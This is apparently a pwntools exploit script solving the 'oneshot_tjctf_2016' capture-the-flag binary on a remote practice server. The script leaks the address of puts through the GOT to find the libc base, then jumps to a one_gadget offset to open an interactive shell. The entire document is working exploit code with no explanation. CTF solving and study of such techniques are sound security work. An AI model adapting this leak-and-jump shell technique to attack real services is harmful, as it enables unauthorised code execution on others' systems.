from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('oneshot_tjctf_2016')
io = remote('node4.buuoj.cn', 28364)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('oneshot_tjctf_2016')
puts_got = elf.got['puts']

io.sendlineafter('Read location?\n', str(puts_got))
io.recvuntil('Value: ')
libc_base = int(io.recvn(18), 16) - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))

# one_gadget = libc_base + 0x45226
one_gadget = libc_base + 0x45216
log.success('one_gadget: ' + hex(one_gadget))
io.sendlineafter('Jump location?\n', str(one_gadget))
io.interactive()

